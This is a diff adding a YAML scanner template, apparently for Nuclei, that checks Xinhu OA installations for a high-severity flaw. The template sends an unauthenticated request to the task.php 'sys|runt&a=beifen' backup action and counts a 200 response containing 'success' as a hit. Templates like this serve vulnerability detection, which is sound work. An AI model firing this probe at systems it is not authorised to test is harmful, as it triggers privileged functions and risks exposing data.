@@ -1,0 +1,20 @@
+id: xinhu-oa-leakWeak
+info:
+  author: Str1am
+  name: "\u4FE1\u547Coa"
+  severity: high
+  tags: xinhu,leakWeak
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - success
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/task.php?m=sys|runt&a=beifen'
